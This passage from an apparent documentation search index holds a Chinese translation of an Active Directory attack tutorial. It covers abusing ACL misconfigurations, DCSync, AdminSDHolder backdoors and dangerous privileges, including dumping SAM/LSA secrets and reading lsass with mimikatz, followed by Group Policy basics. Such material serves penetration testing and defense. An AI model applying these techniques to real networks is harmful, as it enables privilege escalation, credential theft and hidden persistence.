attacks","text":"<p>\u7531\u4e8e\u4e00\u4e2a\u57df\u6765\u8bf4\uff0c\u53ef\u80fd\u6709\u5927\u91cf\u7684ACL\u6d89\u53ca\u5230\u5b83\uff0c\u56e0\u6b64\u7ba1\u7406\u8d77\u6765\u53ef\u80fd\u6bd4\u8f83\u56f0\u96be\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f88\u53ef\u80fd\u4f1a\u5b58\u5728\u4e00\u4e9b\u9519\u8bef\u7684\u914d\u7f6e\uff0c\u800c\u653b\u51fb\u8005\u6b63\u597d\u53ef\u4ee5\u5229\u7528\u5b83\u4eec\u5728\u57df\u4e2d\uff0c\u751a\u81f3\u5728\u6797\u4e2d\u63d0\u5347\u81ea\u5df1\u7684\u6743\u9650\uff08\u8bb0\u4f4f\uff0c\u540c\u4e00\u6797\u4e2d\u7684\u57df\u662f\u76f8\u8fde\u7684\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u6dfb\u52a0\u6d89\u53ca\u5176\u4ed6\u57df\u4e2d\u4e3b\u4f53\u7684ACE\uff09\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u7ed9\u51fa\u4e00\u4e9b\u9519\u8bef\u7684\u914d\u7f6e\u3002</p> <p><code>\u4fee\u6539\u7528\u6237\u5bc6\u7801\uff1a\u5bf9\u4e8e\u67d0\u7528\u6237\u5bf9\u8c61\u6765\u8bf4\uff0c\u53ea\u8981\u60a8\u5177\u6709\u76f8\u5e94\u7684User-Force-Change-Password\u6216GenericAll\u6743\u9650\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u4e00\u4e2a\u65b0\u7684\u5bc6\u7801\u6765\u63a5\u7ba1\u8fd9\u4e2a\u8d26\u6237\u3002 \u4f7f\u7528\u6237\u53ef\u4ee5\u4f7f\u7528Kerberos\uff1a\u5982\u679c\u4f60\u53ef\u4ee5\u5728\u7528\u6237\u7684ServicePrincipalName\u5c5e\u6027\u4e2d\u5199\u5165SPN\uff0c\u5c31\u53ef\u4ee5\u5bf9\u8be5\u8d26\u6237\u53d1\u52a8Kerberoast\u653b\u51fb\uff0c\u8fdb\u800c\u7834\u89e3\u5176\u5bc6\u7801\u3002\u8981\u60f3\u5199\u5165SPN\uff0c\u9700\u8981\u5229\u7528WritePropertyExtended\u6216GenericWrite\u6216GenericAll\u6267\u884cValidated-SPN\u9a8c\u8bc1\u7684\u5199\u5165\u64cd\u4f5c\u3002 \u6267\u884c\u6076\u610f\u7684\u811a\u672c\uff1a\u5982\u679c\u60a8\u80fd\u901a\u8fc7WriteProperty\u3001GenericWrite\u6216GenericAll\u4fee\u6539\u7528\u6237\u7684ScriptPath\u5c5e\u6027\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e2a\u6076\u610f\u6587\u4ef6\uff0c\u8ba9\u7528\u6237\u4e0b\u6b21\u767b\u5f55\u65f6\u6267\u884c\u5b83\u3002\u4f60\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u4e00\u4e2aUNC\u8def\u5f84\u6765\u6307\u5411\u5171\u4eab\u3002\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u80fd\u9700\u8981\u542f\u7528UserAccountControl\u5c5e\u6027\u7684SCRIPT\u6807\u5fd7\u3002 \u5c06\u7528\u6237\u6dfb\u52a0\u5230\u7ec4\uff1a\u5982\u679c\u4f60\u80fd\u7528WriteProperty\u3001GenericWrite\u6216GenericAll\u4fee\u6539\u4e00\u4e2a\u7ec4\u7684members\u5c5e\u6027\uff0c\u90a3\u4e48\u4f60\u5c31\u53ef\u4ee5\u5411\u8be5\u7ec4\u6dfb\u52a0\u4efb\u4f55\u6210\u5458\u3002\u5982\u679c\u4f60\u5177\u6709Self-Membership\u6743\u9650\uff0c\u5c31\u53ef\u4ee5\u628a\u81ea\u5df1\u5f53\u524d\u7684\u7528\u6237\u8d26\u6237\u6dfb\u52a0\u5230\u8be5\u7ec4\u3002 Kerberos RBCD\u653b\u51fb\uff1a\u5982\u679c\u4f60\u80fd\u7528WriteProperty\u3001GenericWrite\u6216GenericAll\u4fee\u6539\u8ba1\u7b97\u673a\u8d26\u6237\u7684msDS-AllowedToActOnBehalfOfOtherIdentity\uff0c\u90a3\u4e48\u4f60\u5c31\u80fd\u4e3a\u53e6\u4e00\u4e2a\u7528\u6237\u542f\u7528Kerberos\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\uff0c\u4ece\u800c\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8bbf\u95ee\u8be5\u8ba1\u7b97\u673a\u3002  LAPS\u5bc6\u7801\uff1a\u5982\u679c\u4f60\u80fd\u8bfb\u53d6LAPS\u7528\u6765\u5b58\u50a8\u673a\u5668\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\u7684\u8ba1\u7b97\u673a\u4fdd\u5bc6\u5c5e\u6027ms-Mcs-AdmPwd\uff0c\u90a3\u4e48\u60a8\u5c31\u80fd\u4ee5\u672c\u5730\u7ba1\u7406\u5458\u7684\u8eab\u4efd\u8bfb\u53d6\u8be5\u5c5e\u6027\u4ee5\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u8ba1\u7b97\u673a\u5e10\u6237\u4e2d\u662f\u5426\u5b58\u5728ms-Mcs- AdmPwdExpirationTime\u5c5e\u6027\u6765\u786e\u5b9a\u8ba1\u7b97\u673a\u4e2dLAPS\u7684\u4f7f\u7528\u60c5\u51b5\u3002 DCSync\u653b\u51fb\uff1a\u5982\u679c\u60a8\u5177\u6709\u57df\u5bf9\u8c61\u7684DS-Replication-Get-Changes\u548cDS-Replication-Get-Changes-All\u6269\u5c55\u6743\u9650\uff0c\u90a3\u4e48\u4f60\u5c31\u53ef\u4ee5\u6267\u884cDCSync\u653b\u51fb\uff0c\u5e76\u8f6c\u50a8\u6570\u636e\u5e93\u5185\u5bb9\u3002 \u6ee5\u7528GPO\uff1a\u5982\u679c\u4f60\u80fd\u7528WriteProperty\u3001GenericWrite\u6216GenericAll\u6765\u4fee\u6539\u7ec4\u7b56\u7565\u5bb9\u5668\u7684GPC-File-Sys-Path\uff0c\u90a3\u4e48\u4f60\u5c31\u53ef\u4ee5\u4fee\u6539GPO\uff0c\u4ee5\u4fbf\u5728\u53d7GPO\u5f71\u54cd\u7684\u8ba1\u7b97\u673a\u4e2d\u6267\u884c\u4ee3\u7801\u3002 \u4fee\u6539ACL\uff1a\u5982\u679c\u60a8\u5177\u6709WriteDacl\uff08\u6216GenericAll\uff09\u6743\u9650\uff0c\u90a3\u4e48\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7\u521b\u5efaACE\u6765\u83b7\u53d6\u5bf9\u8c61\u4e2d\u7684\u4efb\u4f55\u6743\u9650\uff0c\u5e76\u6267\u884c\u4e4b\u524d\u7684\u4e00\u4e9b\u653b\u51fb\u3002\u53e6\u5916\uff0c\u5982\u679c\u4f60\u5177\u6709WriteOwner\u6743\u9650\uff0c\u7531\u4e8e\u6240\u6709\u8005\u5bf9\u8c61\u5177\u6709\u9690\u5f0fWriteDacl\u6743\u5229\uff0c\u6240\u4ee5\uff0c\u60a8\u5c31\u80fd\u628a\u5bf9\u8c61\u6240\u6709\u8005\u6539\u4e3a\u4f60\u7684\u7528\u6237\uff0c\u7136\u540e\u4fee\u6539ACL\u3002</code></p> <p>\u9664\u4e86\u63d0\u5347\u6743\u9650\u5916\uff0c\u5728\u521b\u5efa\u540e\u95e8\u4ee5\u5b9e\u73b0\u6301\u4e45\u8bbf\u95ee\u65f6\uff0cACL\u4e5f\u662f\u76f8\u5f53\u6709\u7528\u7684\uff0c\u5e76\u4e14\u8fd9\u79cd\u65b9\u5f0f\u8fd8\u975e\u5e38\u9690\u853d\u3002\u4e3a\u4e86\u521b\u5efa\u540e\u95e8\uff0c\u53ef\u80fd\u8fd8\u9700\u8981\u7528\u5230\u4e00\u4e9b\u9690\u85cf\u6076\u610fACE\u7684\u6280\u5de7\uff0c\u4e3a\u6b64\u53ef\u4ee5\u53c2\u8003https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#adminsdholder","title":"AdminSDHolder","text":"<p>\u7136\u800c\uff0c\u6700\u6709\u8da3\u7684\u7ef4\u6301\u6743\u9650\u6280\u5de7\u4e4b\u4e00\u53ef\u80fd\u662f\u4fee\u6539AdminSDHolder\u5bf9\u8c61\u3002AdminSDHolder\u662f\u6570\u636e\u5e93\u4e2d\u7684\u4e00\u4e2a\u7279\u6b8a\u5bf9\u8c61\uff0c\u5176DACL\u901a\u5e38\u88ab\u7528\u4f5c\u7279\u6743\u4e3b\u4f53\u5b89\u5168\u63cf\u8ff0\u7b26\u7684\u6a21\u677f\u3002</p> <p><code>PS C:\\&gt; Get-ADObject 'CN=AdminSDHolder,CN=system,DC=contoso,DC=local'  DistinguishedName                              Name          ObjectClass ObjectGUID -----------------                              ----          ----------- ---------- CN=AdminSDHolder,CN=system,DC=contoso,DC=local AdminSDHolder container   7f34e8a5-ffbd-474a-b436-1e02b7b49984</code></p> <p>AdminSDHolder\u5bf9\u8c61</p> <p>\u6bcf\u969460\u5206\u949f\uff0cSDProp\uff08Security Descriptor Propagator\uff09\u5c31\u4f1a\u68c0\u67e5\u8fd9\u4e9b\u7279\u6743\u4e3b\u4f53\u7684\u5b89\u5168\u63cf\u8ff0\u7b26\uff0c\u5e76\u7528AdminSDHolder DACL\u7684\u526f\u672c\u66ff\u6362\u5b83\u4eec\u7684DACL\uff08\u5982\u679c\u5b83\u4eec\u5b58\u5728\u5dee\u5f02\u7684\u8bdd\uff09\u3002\u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u9632\u6b62\u8fd9\u4e9b\u4e3b\u4f53\u7684DACL\u88ab\u7be1\u6539\uff0c\u4f46\u662f\u5982\u679c\u60a8\u80fd\u591f\u5c06\u81ea\u5b9a\u4e49ACE\u6dfb\u52a0\u5230AdminSDHolder DACL\uff0c\u90a3\u4e48\u8fd9\u4e9b\u65b0ACE\u4e5f\u5c06\u5e94\u7528\u4e8e\u53d7\u4fdd\u62a4\u7684\u4e3b\u4f53\u3002</p> <p>\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e0b\u5217\u4e3b\u4f53\u662f\u7531AdminSDHolder\u63d0\u4f9b\u201c\u4fdd\u62a4\u201d\u7684\uff1a</p> <p><code>Account Operators Administrator Administrators Backup Operators Domain Admins Domain Controllers Domain Guests Enterprise Admins Enterprise Key Admins Enterprise Read-Only Domain Controllers Key Admins krbtgt Print Operators Read-only Domain Controllers Replicator Schema Admins Server Operators</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#privileges","title":"Privileges","text":"<p>\u5bf9\u4e8e\u719f\u6089Windows\u5e73\u53f0\u7684\u8bfb\u8005\u6765\u8bf4\uff0c\u53ef\u80fd\u77e5\u9053\u67d0\u4e9b\u7528\u6237\u6743\u9650\u5141\u8bb8\u7528\u6237\u7ed5\u8fc7\u5bf9\u8c61\u7684ACL\u8fdb\u884c\u64cd\u4f5c\u3002\u4f8b\u5982\uff0cWindows\u673a\u5668\u4e2d\u7684SeDebugPrivilege\u6743\u9650\u5141\u8bb8\u5728\u673a\u5668\u7684\u4efb\u4f55\u8fdb\u7a0b\u5185\u5b58\u4e2d\u8fdb\u884c\u8bfb/\u5199\uff0c\u5373\u4f7f\u60a8\u6ca1\u6709\u8fd9\u4e9b\u6743\u9650\u3002</p> <p>\u5728Active Directory\u4e2d\uff0c\u67d0\u4e9b\u6743\u9650\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\uff08\u4e3b\u8981\u662f\u5728\u57df\u63a7\u5236\u5668\u4e2d\uff09\uff1a</p> <ul> <li>SeEnableDelegationPrivilege\uff1a\u5fc5\u987b\u5728\u57df\u63a7\u5236\u5668\u4e2d\u4e3a\u7528\u6237\u8bbe\u7f6eSeEnableDelegationPrivilege\u6743\u9650\uff08\u672c\u5730\u6743\u9650\uff09\uff0c\u7136\u540e\u5b83\u5141\u8bb8\u4fee\u6539\u7528\u6237\u7684msDS-AllowedToDelegateTo\u5c5e\u6027\u4ee5\u53caUserAccountControl\u5c5e\u6027\u4e2d\u7684TRUSTED_FOR_DELEGATION\u548cTRUSTED_TO_AUTH_FOR_DELEGATION\u6807\u5fd7\u3002\u6362\u53e5\u8bdd\u8bf4\uff0cSeEnableDelegationPrivilege\u6743\u9650\u5b9e\u9645\u4e0a\u5141\u8bb8\u63a7\u5236\u57df\u7684Kerberos \u65e0\u7ea6\u675f\u59d4\u6d3e\u548c\u7ea6\u675f\u59d4\u6d3e\u9009\u9879\uff0c\u8fd9\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u7528\u6765\u63d0\u5347\u6743\u9650\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u6743\u9650\u53ea\u8d4b\u4e88\u7ba1\u7406\u5458\u8d26\u6237\u3002</li> <li>SeBackupPrivilege\uff1a\u8be5\u6743\u9650\u5141\u8bb8\u8bfb\u53d6\u57df\u63a7\u5236\u5668\u7684\u4efb\u4f55\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5bf9\u5176\u8fdb\u884c\u5907\u4efd\uff0c\u8fd9\u53ef\u4ee5\u7528\u6765\u8bfb\u53d6\u57df\u6570\u636e\u5e93\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cBackup Operators\u3001Server Operators\u548cAdministrators\u7ec4\u90fd\u5177\u6709\u8fd9\u4e2a\u6743\u9650\u3002\u8be5\u6743\u9650\u53ea\u6709\u5728\u4f7f\u7528NTFS\u5907\u4efdAPI\u65f6\u624d\u6709\u6548\uff0c\u8be5API\u53ef\u4ee5\u901a\u8fc7wbadmin\u5de5\u5177\u6216Powershell WindowsServerBackup\uff08\u4e24\u8005\u90fd\u9700\u8981Windows Server\u5907\u4efd\u529f\u80fd\uff09\u8bbf\u95ee\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528reg save\u547d\u4ee4\u6765\u8bbf\u95eeSAM\u548cLSA\u673a\u5bc6\u3002</li> <li>SeRestorePrivilege\uff1a\u5982\u679c\u5177\u6709\u8fd8\u539f\u6743\u9650\uff0c\u5c31\u80fd\u5c06\u4efb\u610f\u6587\u4ef6\u4ece\u5907\u4efd\u5199\u5165\u57df\u63a7\u5236\u5668\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6743\u9650\u6765\u4fee\u6539\u57df\u7684\u6570\u636e\u5e93\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4f1a\u5c06\u8be5\u6743\u9650\u8d4b\u4e88Backup Operators\u3001Server Operators\u548cAdministrators\u7ec4\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u8be5\u6743\u9650\u6765\u4fee\u6539\u6ce8\u518c\u8868\u9879\u5e76\u5b9e\u73b0\u7279\u6743\u547d\u4ee4\u6267\u884c\u3002SeTakeOwnershipPrivilege\uff1a\u5229\u7528\u8be5\u6743\u9650\uff0c\u53ef\u4ee5\u6210\u4e3a\u673a\u5668\u5b89\u5168\u5bf9\u8c61\u7684\u6240\u6709\u8005\uff0c\u5982\u6587\u4ef6\u3001\u8fdb\u7a0b\u6216\u6ce8\u518c\u8868\u9879\u7b49\u5bf9\u8c61\u3002\u5bf9\u8c61\u7684\u6240\u6709\u8005\u603b\u662f\u53ef\u4ee5\u4fee\u6539\u8be5\u5bf9\u8c61\u7684\u6743\u9650\uff08WriteDacl\uff09\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u4f7f\u7528SetNamedSecurityInfo API\u8c03\u7528\u6765\u53d6\u5f97\u8be5\u5bf9\u8c61\u7684\u6240\u6709\u6743\u3002\u4e0d\u8fc7\uff0c\u600e\u6837\u624d\u80fd\u53d6\u5f97Active Directory\u6570\u636e\u5e93\u5bf9\u8c61\u7684\u6240\u6709\u6743\u5462\uff1f\uff1f\uff1f</li> </ul> <p>\u9664\u4e86\u5728\u57df\u4e2d\u4f7f\u7528\u7684\u6743\u9650\u5916\uff0c\u4e86\u89e3\u5728Windows\u673a\u5668\u4e2d\u53ef\u7528\u4e8e\u63d0\u5347\u6743\u9650\u7684\u5371\u9669\u6743\u9650\u4e5f\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u6bd4\u5982\uff1a</p> <p>SeDebugPrivilege\uff1a\u6709\u4e86\u8be5\u6743\u9650\uff0c\u7528\u6237\u5c31\u53ef\u4ee5\u8c03\u8bd5\u673a\u5668\u4e2d\u7684\u4efb\u4f55\u8fdb\u7a0b\uff0c\u5728\u4efb\u4f55\u8fdb\u7a0b\u4e2d\u6ce8\u5165\u4ee3\u7801\uff0c\u8fdb\u800c\u63d0\u5347\u7279\u6743\uff0c\u6216\u8bfb\u53d6\u8fdb\u7a0b\u7684\u5185\u5b58\uff0c\u4f8b\u5982\uff0c\u8bfb\u53d6\u5df2\u7ecf\u5728\u673a\u5668\u4e0a\u767b\u9646\u7684\u7528\u6237\u7684lsass\u8fdb\u7a0b\u4e2d\u7684\u673a\u5bc6\u4fe1\u606f\uff08\u4e3a\u6b64\uff0c\u53ef\u4ee5\u501f\u52a9\u4e8emimikatz\uff09\u3002</p> <p>SeImpersonatePrivilege\uff1a\u5229\u7528\u8be5\u6743\u9650\uff0c\u7528\u6237\u53ef\u4ee5\u83b7\u5f97\u673a\u5668\u4e2d\u5176\u4ed6\u7528\u6237\u7684\u5b89\u5168\u4ee4\u724c\u3002\u5982\u679c\u6a21\u62df\u4ee4\u724c\u7684\u7ea7\u522b\u4e3aSecurityDelegation\uff0c\u90a3\u4e48\u7528\u6237\u5c31\u53ef\u4ee5\u4f7f\u7528\u8be5\u4ee4\u724c\u5728\u8be5\u57df\u7684\u5176\u4ed6\u673a\u5668\u4e0a\u5192\u5145\u76ee\u6807\u7528\u6237\uff08SecurityDelegation\u4ee4\u724c\u4e0e\u7528\u6237\u51ed\u636e\u76f8\u5173\uff0c\u5982Kerberos\u7968\u8bc1\uff0c\u53ef\u7528\u4e8e\u7f51\u7edc\u8fde\u63a5\uff09\u3002\u5982\u679c\u6a21\u62df\u4ee4\u724c\u7ea7\u522b\u662fSecurityImpersonation\uff0c\u90a3\u4e48\u76ee\u6807\u7528\u6237\u53ea\u80fd\u5728\u672c\u5730\u673a\u5668\u4e2d\u88ab\u5192\u5145\uff08\u5bf9\u7279\u6743\u63d0\u5347\u5f88\u6709\u7528\uff09\u3002SeImpersonatePrivilege\u662f\u8d4b\u4e88\u201cNT AUTHORITY\\Network Service\u201d\u7684\uff0c\u5b83\u901a\u5e38\u7528\u4e8e\u8fd0\u884c\u7f51\u7edc\u670d\u52a1\u5668\u548c\u7c7b\u4f3c\u7684\u4e1c\u897f\uff0c\u6240\u4ee5\uff0c\u5982\u679c\u4f60\u80fd\u5165\u4fb5\u7f51\u7edc\u670d\u52a1\u5668\uff0c\u5c31\u53ef\u4ee5\u5229\u7528incognito\u6765\u5192\u5145\u7f51\u7edc\u4e0a\u7684\u67d0\u4e9b\u57df\u7528\u6237\u3002\u4f46\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u5982\u679c\u4f60\u60f3\u7528SeImpersonatePrivilege\u5728\u672c\u5730\u673a\u5668\u4e0a\u63d0\u5347\u6743\u9650\uff0c\u53ef\u4ee5\u53c2\u9605https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html\u3002</p> <p>\u5728Windows\u673a\u5668\u4e2d\uff0c\u8fd8\u6709\u5176\u4ed6\u7279\u6743\u53ef\u4ee5\u7528\u6765\u5b9e\u73b0\u7279\u6743\u7684\u63d0\u5347\uff0c\u5982\u679c\u60a8\u5bf9\u5b83\u4eec\u611f\u5174\u8da3\uff0c\u8bf7\u53c2\u9605FoxGlove\u7684token-priv\u5b58\u50a8\u5e93\uff0c\u5176\u4e2d\u63d0\u4f9b\u4e86\u66f4\u52a0\u8be6\u7ec6\u7684\u4ecb\u7ecd\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#group-policy","title":"Group Policy","text":"<p>Active Directory\u7684\u76ee\u6807\u662f\u7ba1\u7406\u7ec4\u7ec7\u7684\u8ba1\u7b97\u673a\u548c\u7528\u6237\uff0c\u5176\u4e2d\u90e8\u5206\u7ba1\u7406\u8fc7\u7a0b\u662f\u901a\u8fc7\u7ec4\u7b56\u7565\u6765\u5b9e\u73b0\u7684\u3002</p> <p>\u7ec4\u7b56\u7565\u662f\u4e00\u79cd\u5141\u8bb8\u5c06\u4e00\u7ec4\u89c4\u5219/\u64cd\u4f5c\u5e94\u7528\u4e8eActive Directory\u7f51\u7edc\u7528\u6237\u548c\u8ba1\u7b97\u673a\u7684\u673a\u5236\uff0c\u6bd4\u5982\uff1a</p> <ul> <li>\u7981\u7528NTLM</li> <li>\u68c0\u67e5\u5bc6\u7801\u590d\u6742\u5ea6</li> <li>\u6267\u884c\u9884\u5b9a\u7684\u6216\u5373\u4f7f\u7684\u4efb\u52a1</li> <li>\u5728\u8ba1\u7b97\u673a\u4e2d\u521b\u5efa\u672c\u5730\u7528\u6237</li> <li>\u8bbe\u7f6e\u9ed8\u8ba4\u58c1\u7eb8</li> <li>\u7528OneDrive\u540c\u6b65\u6587\u4ef6</li> <li>\u7b49\u7b49</li> </ul> <p>\u4e3a\u4e86\u5b9a\u4e49\u89c4\u5219\uff0c\u53ef\u4ee5\u521b\u5efa\u7ec4\u7b56\u7565\u5bf9\u8c61\u3002\u6bcf\u4e2aGPO\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u53ef\u4ee5\u5e94\u7528\u4e8e\u57df\u4e2d\u7279\u5b9a\u673a\u5668\u7684\u7b56\u7565\u3002\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u521b\u5efa\u9002\u7528\u4e8e\u6574\u4e2a\u8ba1\u7b97\u673a\u6216\u7528\u6237\u4f1a\u8bdd\u7684\u7b56\u7565\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u5728\u8ba1\u7b97\u673a\u542f\u52a8\u6216\u7528\u6237\u767b\u5f55\u65f6\u6267\u884c\u811a\u672c\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#gpo-scope","title":"GPO Scope","text":"<p>\u521b\u5efaGPO\u65f6\uff0c\u60a8\u9700\u8981\u6307\u5b9a\u5c06\u5176\u5e94\u7528\u4e8e\u54ea\u4e9b\u8ba1\u7b97\u673a\u3002\u4e3a\u6b64\uff0c\u9700\u8981\u5c06GPO\u94fe\u63a5\u5230\u4ee5\u4e0b\u6570\u636e\u5e93\u5bb9\u5668\u4e4b\u4e00\uff1a</p> <ul> <li>\u57df</li> <li>\u7ec4\u7ec7\u5355\u4f4d(OU)</li> <li>\u7ad9\u70b9\uff08\u4e00\u4e2a\u5bb9\u5668\uff0c\u7528\u4e8e\u5bb9\u7eb3\u7269\u7406\u4e0a\u63a5\u8fd1\u7684\u8ba1\u7b97\u673a\u7ec4\uff0c\u4e0d\u5efa\u8bae\u7528\u4e8eGPO\uff09</li> </ul> <p>Windows\u8ba1\u7b97\u673a\u4e5f\u53ef\u80fd\u5177\u6709\u672c\u5730\u7ec4\u7b56\u7565\u3002\u56e0\u6b64\uff0c\u8bb8\u591a\u4e0d\u540c\u7684GPO\u53ef\u4ee5\u5e94\u7528\u4e8e\u4e0d\u540c\u7ea7\u522b\u7684\u673a\u5668\uff0c\u8fd9\u4e9bGPO\u6309\u4ee5\u4e0b\u987a\u5e8f\u5904\u7406\uff1a</p> <ul> <li>\u672c\u5730</li> <li>\u7ad9\u70b9</li> <li>\u57df</li> <li>\u7ec4\u7ec7\u5355\u4f4d</li> </ul> <p>\u5728\u8fd9\u91cc\uff0c\u672c\u5730GPO\u662f\u6700\u4e0d\u53d7\u6b22\u8fce\u7684\uff0c\u800cOU GPO\u662f\u6700\u53d7\u6b22\u8fce\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u5e94\u7528\u4e8e\u57df\u7684GPO\u4e0e\u672c\u5730GPO\u76f8\u77db\u76fe\uff0c\u5219\u5c06\u9075\u5faa\u57dfGPO\u3002</p> <p>\u4f46\u662f\uff0cActive Directory GPO\uff08\u975e\u672c\u5730\uff09\u4e5f\u53ef\u4ee5\u5c06\u89c4\u5219\u5efa\u7acb\u4e3aNo Override\u7c7b\u578b\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86\u57df\u7b56\u7565\u89c4\u5219\uff0c\u5219\u6765\u81eaOU\u7684\u4efb\u4f55\u89c4\u5219\u90fd\u4e0d\u80fd\u4e0e\u8be5\u4e0a\u7ea7\u89c4\u5219\u76f8\u77db\u76fe\u3002</p> <p>\u53e6\u5916\uff0cGPO\u53ef\u4ee5\u6709\u4e00\u4e2a\u5173\u8054\u7684WMI\u67e5\u8be2\uff0c\u8be5\u67e5\u8be2\u5141\u8bb8\u7b5b\u9009\u5c06\u5e94\u7528GPO\u7684\u8ba1\u7b97\u673a\u3002\u4f8b\u5982\uff0c\u4ec5\u5c06\u7b56\u7565\u5e94\u7528\u4e8eWindows7\u8ba1\u7b97\u673a\u3002</p> <p>\u5728\u57df\u4e2d\uff0c\u6bcf\u53f0\u8ba1\u7b97\u673a\u6bcf90\u5206\u949f\u68c0\u67e5\u4e00\u6b21\u7b56\u7565\u66f4\u65b0\uff0c\u4f46\u57df\u63a7\u5236\u5668\u9664\u5916\uff0c\u5b83\u6bcf5\u5206\u949f\u68c0\u67e5\u4e00\u6b21\u3002\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528gpupdate\u6267\u884c\u5373\u65f6\u68c0\u67e5\u3002</p> <p>\u6bcf\u4e2aGPO\u90fd\u662f\u901a\u8fc7GUID\u8fdb\u884c\u6807\u8bc6\uff0c\u5e76\u5305\u542b\u4e24\u4e2a\u5b9e\u4f53\uff1aGroup Policy\u6a21\u677f\u548cGroup Policy\u5bb9\u5668\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#group-policy-template","title":"Group Policy template","text":"<p>Group Policy\u6a21\u677f\u662fSYSVOL\u5171\u4eab\u4e2d\u7684\u4e00\u4e2a\u76ee\u5f55\u3002\u8fd9\u4e9b\u6a21\u677f\u901a\u5e38\u4f4d\u4e8e\\\\SYSVOL\\\\Policies\\\u4e2d\u3002\u5e76\u4e14\uff0c\u6bcf\u4e2a\u6a21\u677f\u76ee\u5f55\u90fd\u662f\u4f7f\u7528GPO GUID\u547d\u540d\u7684\u3002 <p><code>PS C:\\&gt; ls \\\\contoso.local\\SYSVOL\\contoso.local\\Policies\\      Directory: \\\\contoso.local\\SYSVOL\\contoso.local\\Policies   Mode                LastWriteTime         Length Name ----                -------------         ------ ---- d-----       11/28/2020  10:02 AM                {31B2F340-016D-11D2-945F-00C04FB984F9} d-----       11/28/2020  10:02 AM                {6AC1786C-016F-11D2-945F-00C04fB984F9} d-----        4/19/2021   5:12 PM                {BE864EFE-6C07-4A53-A9D8-7EB6EB36BE5A}</code></p> <p>GP\u6a21\u677f</p> <p>\u6bcf\u4e2aGPO\u76ee\u5f55\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>\u673a\u5668\u76ee\u5f55\uff1a\u7528\u4e8e\u673a\u5668\u7ea7\u7b56\u7565\u3002</li> <li>\u7528\u6237\u76ee\u5f55\uff1a\u7528\u4e8e\u7528\u6237\u7ea7\u7b56\u7565\u3002</li> <li>GPT.INI\uff1a\u5173\u4e8eGPO\u7684\u57fa\u672c\u4fe1\u606f\u3001\u7248\u672c\u548c\u663e\u793a\u540d\u79f0\u3002</li> </ul> 